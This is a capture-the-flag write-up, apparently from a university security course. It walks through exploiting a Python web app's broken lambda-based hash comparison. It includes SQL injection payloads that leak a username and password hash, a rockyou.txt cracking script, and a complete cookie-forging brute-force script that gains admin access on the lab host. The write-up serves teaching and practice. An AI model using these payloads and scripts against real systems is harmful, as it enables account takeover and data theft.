Upon examining the source code, one function immediately stood out:

```python
checks = [lambda a, b: ord(a[i]) ^ ord(b[i]) for i in range(0, 128)]
def safe_hash_cmp(a, b):
  if len(a) != 128 or len(b) != 128:
    return False
  return sum(check(a, b) for check in checks) == 0
```

This function attempts to securely compare two SHA-512 hashes, but does so **in an insecure way**. Instead of using a constant-time comparison, it calculates the sum of XORs across each character in the two strings using a list of lambdas.

### Why This is Vulnerable

- `checks` is a list of 128 **lambdas referencing the same variable `i`**, which leads to unintended behavior—only the final value of `i` (i.e., 127) is actually captured.
- As a result, instead of comparing **all characters**, it effectively compares just the **last character** of the hash.

Thus, **if we can guess the last character of the digest correctly**, the function will return `True`, and our forged cookie will be accepted.

---

## The Target

Once a cookie passes the `safe_hash_cmp`, the server continues with another check:

```python
result = get_db().cursor().execute(
  "SELECT name FROM users WHERE name=? and password=?;",
  (cookie['user'], hashlib.sha512(salt + bytes(cookie['password'], 'ascii')).hexdigest())
).fetchone()
```

This validates the user and password stored in the cookie against the database. So even if we forge a valid digest, the user/password in the cookie must match a real entry.

Unfortunately, we cannot register new users. So we need to extract an existing user's credentials.

---

## SQL Injection

The login endpoint contains this vulnerable query:

```python
result = c.execute("SELECT name, password, admin FROM users WHERE name ='%s';" % user).fetchone()
```

This allows us to inject arbitrary SQL in the `user` field.

### Step 1: Leak a Real Username

Payload:

```
' OR 1=1 --
```

Response:

```json
{ "error": "You're not Chantay Kostiuk!" }
```

We now have a valid username.

### Step 2: Leak Password Hash

Payload:

```
' UNION SELECT password, name, admin FROM users WHERE name = 'Chantay Kostiuk' --
```

Response:

```json
{ "error": "You're not 3dbaf7a0..." }
```

We’ve just leaked Chantay’s **password hash**.

---

## Cracking the Hash

The server hashes passwords like this:

```python
hashlib.sha512(salt + password).hexdigest()
```

With:

```python
salt = b'no_google_for_you'
```

We used `rockyou.txt` to crack the hash:

```python
import hashlib

salt = b'no_google_for_you'
target_hash = "3dbaf7a06a402ef2..."

with open('rockyou.txt', 'rb') as f:
    for line in f:
        password = line.strip()
        if hashlib.sha512(salt + password).hexdigest() == target_hash:
            print(f"Password found: {password.decode()}")
            break
```

**Password found: `061090`**

---

## Forging the Cookie

Now that we know:

- Valid username: `Chantay Kostiuk`
- Valid password: `061090`

We can forge a cookie like so:

```python
import json
import binascii
import requests
from tqdm import tqdm

# Config
TARGET_URL = "http://shell.hackintro25.di.uoa.gr:57828/"
COOKIE_NAME = "auth"
USER = "Chantay Kostiuk"
PASSWORD = "061090"
ADMIN = 1

def forge_cookie(last_char_guess):
    """Create cookie JSON with guessed last char of digest"""
    cookie = {
        "user": USER,
        "password": PASSWORD,
        "admin": ADMIN,
        "digest": "0" * 127 + last_char_guess
    }
    cookie_json = json.dumps(cookie)
    cookie_hex = binascii.hexlify(cookie_json.encode('ascii')).decode()
    return cookie_hex

def test_cookie(cookie_hex):
    """Test if cookie is accepted by server (status 200 means success)"""
    cookies = {COOKIE_NAME: cookie_hex}
    try:
        response = requests.get(TARGET_URL, cookies=cookies, allow_redirects=False, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

def main():
    print("[*] Starting brute-force of last digest character...")
    success = False
    for ch in tqdm('0123456789abcdef'):
        forged_cookie = forge_cookie(ch)
        if test_cookie(forged_cookie):
            success = True
            break
    if(success):
        print(f"\n[+] Success! Valid cookie found with last digest char '{ch}'")
        print(f"[+] Forged cookie (hex): {forged_cookie}")
        print(f"[+] You can use this cookie to access the admin page!")
    else:
        print("[-] Failed to forge a valid cookie")


if __name__ == "__main__":
    main()
```

### Output

```
[+] Valid forged cookie with last digest char 'a':
<hex-encoded-cookie>
```

Using this cookie, I was authenticated as admin, and accessed the flag.
